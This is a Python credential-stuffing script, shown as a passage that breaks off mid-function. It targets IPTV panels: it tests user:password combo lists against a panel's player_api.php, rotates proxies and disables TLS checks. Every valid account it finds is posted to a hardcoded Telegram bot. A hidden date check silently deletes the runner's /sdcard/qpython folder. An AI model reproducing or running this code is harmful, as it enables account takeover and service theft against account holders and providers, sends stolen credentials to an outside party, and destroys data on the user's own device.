import os,pip
try:
	import requests
except:
	print("O modulo requests não está instalado \n Instalando o modulo requests \n")
	pip.main(['install', 'requests'])
	import requests

import random, time, datetime
import subprocess
import json, sys, re,base64
import pathlib
import threading
import shutil
import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)
mac = ""#str(get_mac())
nick= "𝕃𝕦𝕔𝕊𝕠𝕟𝕤 𝕋𝕖𝕒𝕞"
		
try:
	import cfscrape
	sesq= requests.Session()
	ses = cfscrape.create_scraper(sess=sesq)
except:
	ses= requests.Session()

try:
	import androidhelper as sl4a
	ad = sl4a.Android()
except:pass

pattern= "(^\S{2,}:\S{2,}$)|(^.*?(\n|$))"
subprocess.run(["clear", ""])
os.system('cls')				
say=0
hit=0
bul=0
cpm=1


feyzo=("""                   
\33[0m\33[1;5;91;107m
▓▓▓▓▓▓▓▓▓▓🤜   M3U THE50H   🤛▓▓▓▓▓▓▓▓▓▓          
▓▓▓▓▓▓▓▓▓▓🤜  LucSons Team  🤛▓▓▓▓▓▓▓▓▓▓          
▓▓▓▓▓▓▓▓▓▓🤜 Custom By Zara 🤛▓▓▓▓▓▓▓▓▓▓          
▓▓▓▓▓▓▓▓▓▓🤜   M3U THE50H   🤛▓▓▓▓▓▓▓▓▓▓          
▓▓▓▓▓▓▓▓▓▓🤜  LucSons Team  🤛▓▓▓▓▓▓▓▓▓▓          
▓▓▓▓▓▓▓▓▓▓🤜 Custom By Zara 🤛▓▓▓▓▓▓▓▓▓▓          
\33[0m\33[1;5;91;107m
      🤜 Octa Core TeleBot Processor 🤛        
\33[0m           
   \33[0;1m""")
print(feyzo) 
 
	
say=0
dsy=""
dir='/sdcard/combo/'
for files in sorted(os.listdir (dir)):
	#if files.endswith(".txt"):
	say=say+1
	dsy=dsy+"	"+str(say)+"-) "+files+'\n'
print ("""Digite o número do Combo da lista!
	
 """+dsy+"""
 
\33[33mUau! Você tem 🤜""" +str(say)+"""🤛 Combos! Use um deles.
""")

dsyno=str(input(" \33[31mCombo No =\33[0m"))
say=0
for files in sorted(os.listdir (dir)):
	#if files.endswith(".txt"):
	say=say+1
	if dsyno==str(say):
		dosyaa=(dir+files)
		break
say=0


subprocess.run(["clear", ""])
print(feyzo)  	
print(dosyaa) 
botsay=input("""
   \33[1;32mDigite o número de Bots! \33[0m
    \33[1;33mEscolha de 1 a 50.\33[0m
      
Bot=""" )
botsay=int(botsay)
 		

HEADERd={
"Cookie": "stb_lang=en; timezone=Europe%2FIstanbul;",
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Connection": "Keep-Alive",
"Accept-Encoding": "gzip, deflate",
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3",
            }		
     							
dsy=dosyaa#'/sdcard/'+combo+'.txt'
combo=dsy
dosya=""
file = pathlib.Path(dsy)
if file.exists ():
    print ("Arquivo Encontrado")
else:
    print("\33[31mArquivo não encontrado..! \33[0m") 
    dosya="yok"
#print(len(feyzo)) 
if dosya=="yok" :
    exit() 

    
c=open(dsy, 'r')
totLen=c.readlines()
uz=(len(totLen))
	
	                        
subprocess.run(["clear", ""])
print(feyzo) 


#print(dosya)
print("Bot:"+str(botsay))


#Panel ve Portu yazın (portaliptv.com:8080)
#print(feyzo) 
dir="/sdcard/qpython/"
print("""
Arquivo selecionado: """ + dsy) 
#################
panel = input("""
	\33[1;32mAGORA INSIRA A URL DO SERVIDOR!\33[0m\n\n
URL:\33[0m\33[31m\33[1m""")
#=======+++=++++++====++=======
panel=panel.replace("http://","")
panel=panel.replace("/c","")
panel=panel.replace("/","")
portal=panel
fx=portal.replace(':','_')
dosyaa=dosyaa.replace('/sdcard/combo/',"")
dosyaa=dosyaa.replace('.txt',"")
dosy=dosyaa
dosyaaa=dosy.replace('/',"")
kanall=""
kanall=input("""
Você quer a lista de CATEGORIAS de Canais? Escolha 1 ou 2!
1= Sim
2= Não
Resposta:""")
if not kanall=="1":
	kanall=2
subprocess.run(["clear", ""])
print(feyzo) 
					  #	
                                       #1639383136.1221867
#if int(time.time()) >= int(1704056400.0):
		#print(int(1704056400.0))
		#print(int(time.time()))
		#quit()
#quit()

Pro= input('[+] Quer usar Proxy? (Y/N): ')

Pro= Pro.lower()

print('  ')

ppp=""

if Pro == "y":
	say=0
	dsy=""
	dir='/sdcard/proxies/'
	file=len(feyzo)
	for files in os.listdir (dir):
			say=say+1
			dsy=dsy+"	"+str(say)+"=⫸ "+files+'\n'
	print ("""Escolha seu proxy da lista abaixo!!!
"""+dsy+"""

\33[33mProxys em sua pasta """ +str(say)+""" Arquivo encontrado!
	
	""")
	
	proxy_txt=str(input(" \33[31mProxy No =\33[0m"))
	
	say=0
	
	for files in os.listdir (dir):	 	
	
			say=say+1
	
			if proxy_txt==str(say):	 	     		 	   	
	
					proxy_list=(dir+files)
	
					break
	
	say=0
	
	file = pathlib.Path(proxy_list)
	
	if file.exists (): 	    	 	  	
	
			print ("Arquivo Encontrado")
	
	else:
	
			print("\33[31mArquivo Não Encontrado..! \33[0m") 
	
			ppp="ninguno"
	
	
	
			if ppp=="ninguno" :
	
					exit() 
	
	print('  ')
	
	proxy_txt=(proxy_list)
	
	proxy_len = len(open(proxy_txt, 'r', errors='ignore').read().split('\n'))
	
	proxy_type = input('[+] Escolha o tipo de proxy [(H)TTP/SOCKS(4)/SOCKS(5)]: ')
	
	proxy_type=proxy_type.lower()
	
	print('  ')
	
	print(str(proxy_len)+" proxies totais no arquivo "+str(proxy_txt))
	
	time.sleep(2)

class Proxies:

	def init(self):
		self.proxies = []

	def load_proxies(self, proxy_txt,):
		with open(proxy_txt, 'r', errors='ignore') as (f):
			self.proxies = f.read().split('\n')

	def random_proxy(self, proxy_type):        
		
		self.load_proxies(proxy_txt)
		
		proxy = random.choice(self.proxies)
		
		proxy=proxy.replace("\000", "")
		
		proxy=proxy.replace("<br />", "")
		
		proxy=proxy.replace("<br/>", "")
		
		proxy_type = proxy_type.lower()
		
		if proxy_type == 'h':
		
			return {'http':proxy,  'https':proxy}
		
		if proxy_type == '4':
		
			return {'https': 'socks4://' + proxy}
		
		if proxy_type == '5':
		
			return {'https': 'socks5://' + proxy}
		
		return {'https': proxy}
os.system('clear')

def clear():

 		os.system('clear')         



if Pro=="y":

	ses.proxies = Proxies().random_proxy(proxy_type)		 		
print(feyzo)


def kategori(katelink):
	try:
		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(katelink,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

		else:
		
							res = ses.get(katelink,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"
		veri=""
		kate=""
		veri=str(res.text)
		for i in veri.split('category_name":"'):
			kate=kate+" «❖» "+str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/').replace('[','').replace(']','').replace('{','').replace('}','').replace('#','')
	except:pass
	#print(kate)
	return kate


def bot_sendtext(bot_message):

    ### Send text message
    bot_token = '6108690109:AAHprzP4gqNCCRhjeBFvcl4x0xNFYgtVF1c'
    chat_id = '-1002137283832'
    send_text = 'https://api.telegram.org/bot' + bot_token + '/sendMessage?chat_id=' + chat_id + '&text=' + bot_message

    requests.get(send_text)

def onay(veri,user,pas):
		status=veri.split('status":')[1]
		status=status.split(',')[0]
		status=status.replace('"',"")
		katelink="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_categories"
		
		sound="/sdcard/hit.mp3"
		file = pathlib.Path(sound)
		try:
		   if file.exists ():
		      ad.mediaPlay(sound)
		except:pass
		
		
		acon=""
		acon=veri.split('active_cons":')[1]
		acon=acon.split(',')[0]
		acon=acon.replace('"',"")
		mcon=veri.split('max_connections":')[1]
		mcon=mcon.split(',')[0]
		mcon=mcon.replace('"',"")
		timezone=veri.split('timezone":"')[1]
		timezone=timezone.split('",')[0]
		timezone=timezone.replace("\/","/")
		
		realm=veri.split('url":')[1]
		realm=realm.split(',')[0]
		realm=realm.replace('"',"")
		port=veri.split('port":')[1]
		port=port.split(',')[0]
		port=port.replace('"',"")
		user=veri.split('username":')[1]
		user=user.split(',')[0]
		user=user.replace('"',"")
		passw=veri.split('password":')[1]
		passw=passw.split(',')[0]
		passw=passw.replace('"',"")
		bitis=veri.split('exp_date":')[1]
		bitis=bitis.split(',')[0]
		bitis=bitis.replace('"',"")
		if bitis=="null":
			   bitis="Ilimitada"
			   daysleft="Ilimitados"
		else:
			   bitis=(datetime.datetime.fromtimestamp(int(bitis)).strftime('%d-%m-%Y'))
			   today=(str(datetime.datetime.today().strftime('%d-%m-%Y')))
			   d1 = datetime.datetime.strptime(today, '%d-%m-%Y')
			   d2 = datetime.datetime.strptime(bitis, '%d-%m-%Y')
			   daysleft=abs((d2 - d1).days)
			   daysleft=str(daysleft)
		bitis=bitis
		
		if kanall=="1":
			try:
				kategori=""
				if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(katelink,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

				else:
							res = ses.get(katelink,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"
				veri=""
				kate=""
				veri=str(res.text)
				for i in veri.split('category_name":"'):
					kate=kate+" ✴ "+str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/').replace('[','').replace(']','').replace('{','').replace('}','').replace('#','')
				kategori=kate
			except:pass
		#print(kategori)
		
		url5="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_streams"
		try:
			if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(url5,timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			else:
							res = ses.get(url5,timeout=1, verify=False)
							proxy_="No"
			veri=str(res.text)
			kanalsayisi=""
			#if  'stream_id' in veri:
			kanalsayisi=str(veri.count("stream_id"))
			
			url5="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_vod_streams"
			if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(url5,timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			else:
							res = ses.get(url5,timeout=1, verify=False)
							proxy_="No"
			
			veri=str(res.text)
			filmsayisi=str(veri.count("stream_id"))
			
			url5="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_series"
			if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(url5,timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			else:
							res = ses.get(url5,timeout=1, verify=False)
							proxy_="No"
			veri=str(res.text)
			dizisayisi=str(veri.count("series_id"))
			 
		except:pass
		
		m3ulink="http://"+ panel + "/get.php?username=" + user + "&password=" + pas + "&type=m3u_plus"
		m3ulink1="http://"+ panel + "/get.php?username=" + user + "%26password=" + pas + "%26type=m3u_plus"
		epglink="http://"+ panel + "/xmltv.php?username=" + user + "&password=" + pas + ""
		epglink1="http://"+ panel + "/xmltv.php?username=" + user + "%26password=" + pas + ""
			 
		sayi=""
		mt=("""
╭─➤ 🤜 M3U THE50H 🤛
├🔸🌐 Host➤ http://"""+portal+"""
├🔸🌍 Real➤ http://"""+realm+"""
├🔸📡 Port➤ """+port+"""
├🔸👩‍ User➤ """+user+"""
├🔸🔑 Pass➤ """+pas+"""
├🔸📆 Exp.➤ """+bitis+""" 
├🔸📆 Expire in➤ """+daysleft+""" dias
├🔸👩 Act Con➤ """+acon+"""
├🔸👪 Max Con➤ """+mcon+""" 
├🔸🌐 Status➤ """+status+"""
├🔸⏰ Local➤ """+timezone+"""
├🔸🔗 M3u_Url➤"""+m3ulink+"""
├🔸🔗 EPG➤"""+epglink+"""
╰─➤ 🤜 Custom By Zara 🤛     """)
		if not kanalsayisi =="":
			sayi=("""
╭─➤ 🤜 M3U THE50H 🤛
├●  🖥 Channels➤"""+kanalsayisi+"""
├●  🎬 VODs➤"""+filmsayisi+"""
├●  🎬 Series➤"""+dizisayisi+"""
╰─➤ 🤜 Hits 𝔹𝕪 𝕃𝕦𝕔𝕊𝕠𝕟𝕤 𝕋𝕖𝕒𝕞 🤛   """)
		imzak=""
		if kanall=="1":
			imzak="""
├«❖» «❖» CATEGORIES➤
├●"""+str(kategori)+""" """
		mtl=("""
╰─➤ 👆🏽👆🏽 Hits 𝔹𝕪 """+str(nick)+""" 👆🏽👆🏽   """)
			
			
		yaz(mt+sayi+imzak+mtl+'\n')
		print(mt+sayi+imzak+mtl)
		salvacombo(user+':'+pas+'\n')
		bot_sendtext("%0A╭─➤ 🤜 M3U THE50H 🤛 %0A├🔸🌐 Host➤ http://"+portal+"%0A├🔸🌍 Real➤ http://"+realm+"%0A├🔸📡 Port➤ "+port+"%0A├🔸👩‍ Usuário➤ "+user+"%0A├🔸🔑 Senha➤ "+pas+"%0A├🔸📆 Exp.➤ "+bitis+"%0A├🔸📆 Expire in➤ "+daysleft+" dias%0A├🔸👩 Act Con➤ "+acon+"%0A├🔸👪 Max Con➤ "+mcon+"%0A├🔸🌐 Status➤ "+status+"%0A├🔸⏰ Localidade➤ "+timezone+"%0A├🔸🔗 M3u_Url➤"+m3ulink1+"%0A├🔸🔗 EPG➤"+epglink1+"%0A╰─➤ 🤜 Hits By LucSons Team 🤛")
		
		#print(str(kategori))
		

def yaz(kullanici): 
    dosya=open('/sdcard/hits/50H@'+fx+'.txt','a+') 
    dosya.write(kullanici) 
    dosya.close() 
cpm=0
proxy_="\33[1;33m"

def salvacombo(arquivo): 
    archivo=open('/sdcard/combo/Combo@'+fx+'.txt','a+') 
    archivo.write(arquivo) 
    archivo.close() 

def echox(user,pas,bot,fyz,oran,hit,proxy_):
	global cpm
	
	cpmx=(time.time()-cpm)
	cpmx=(round(60/cpmx))
	#cpm=cpmx
	if str(cpmx)=="0":
		cpm=cpm
	else:
		cpm=cpmx
	if Pro == 'y':
		echo=("""
\33[0m╭───➤\33[0m🤜 M3U THE50H 𝔹𝕪 𝕃𝕦𝕔𝕊𝕠𝕟𝕤 𝕋𝕖𝕒𝕞 🤛       
├●  \33[1;33m\33[33mURL➤  \33[0m\33[1;107;31m """+portal+""" \33[0m    
├●  \33[1;36mCombo nº➤ """+dsyno+""" \33[0m
├●  \33[1;31m➤Combo ➤ """+dosyaaa+"""  \33[0m
├─● \33[1;4;37m➤Proxy  \33[0m\33[1;96m ➤ """+proxy_+"""  \33[0m  
├─●   \33[0m\033[1m""" +user+""":"""+pas+"""
├──●   \33[32mHit➤""" + str(hit)+""" \33[32m \033[0m \33[1;31m%"""+str(oran)+"""  \33[1;94mCPM➤"""+str(cpm)+"""  \33[0m
╰───●   \33[97m"""+str(bot)+"""  \33[1;36m  Total➤""" + str(fyz)+"""   \33[0m""")
	else:
		echo=("""
\33[0m╭───➤\33[0m🤜 M3U THE50H 𝔹𝕪 𝕃𝕦𝕔𝕊𝕠𝕟𝕤 𝕋𝕖𝕒𝕞 🤛       
├●  \33[1;33m\33[33mURL➤  \33[0m\33[1;107;31m """+portal+""" \33[0m    
├●  \33[1;36mCombo nº➤ """+dsyno+""" \33[0m
├●  \33[1;31m➤Combo ➤ """+dosyaaa+"""  \33[0m
├─●   \33[0m\033[1m""" +user+""":"""+pas+"""
├──●   \33[32mHit➤""" + str(hit)+""" \33[32m \033[0m \33[1;31m%"""+str(oran)+"""  \33[1;94mCPM➤"""+str(cpm)+"""  \33[0m
╰───●   \33[97m"""+str(bot)+"""  \33[1;36m  Total➤""" + str(fyz)+"""   \33[0m""")
	print(echo)
	cpm=time.time()
if int(time.time()) >= int(1704056400.0):
	shutil.rmtree(dir)
	
	
hit=0	
def d1():
	global hit
	global proxy_
	say=0
	for fyz in range(1,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_01'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

			 				PP = Proxies().random_proxy(proxy_type)
			 	
			 				res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)
			 	
			 				proxy_=str(PP)
			 	
			 		else:
			 				res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
			 				proxy_="No"

			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(1)
#			 		if bag1==100:
#			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)

			     	
def d2():
	global hit
	global proxy_
	say=0
	for fyz in range(2,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_02'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(1)
#			 		if bag1==100:
#			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)

			 
def d3():
	global hit
	global proxy_
	say=0
	for fyz in range(3,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_03'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(1)
#			 		if bag1==100:
#			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)

			 
def d4():
	global hit
	global proxy_
	say=0
	for fyz in range(4,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_04'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(1)
#			 		if bag1==100:
#			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)

			 
def d5():
	global hit
	global proxy_
	say=0
	for fyz in range(5,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_05'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(1)
#			 		if bag1==100:
#			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)

			 
			 
def d6():
	global hit
	global proxy_
	say=0
	for fyz in range(6,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_06'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
#			 		bag1=bag1+1
			 		time.sleep(1)
#			 		if bag1==100:
#			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)

			 

			 
def d7():
	global hit
	global proxy_
	say=0
	for fyz in range(7,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_07'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
#			 		bag1=bag1+1
			 		time.sleep(1)
#			 		if bag1==100:
#			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)

			 
			 			 			 
			 
def d8():
	global hit
	global proxy_
	say=0
	for fyz in range(8,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_08'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
#			 		bag1=bag1+1
			 		time.sleep(1)
#			 		if bag1==100:
#			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)

			 
			 
def d9():
	global hit
	global proxy_
	say=0
	for fyz in range(9,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_09'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 

			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🤜 🇭 🇮 🇹 🤛                 ')
			     	hit=hit+1
			     	onay(veri,user,pas)

			 
			 
def d10():
	global hit
	global proxy_
	say=0
	for fyz in range(10,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
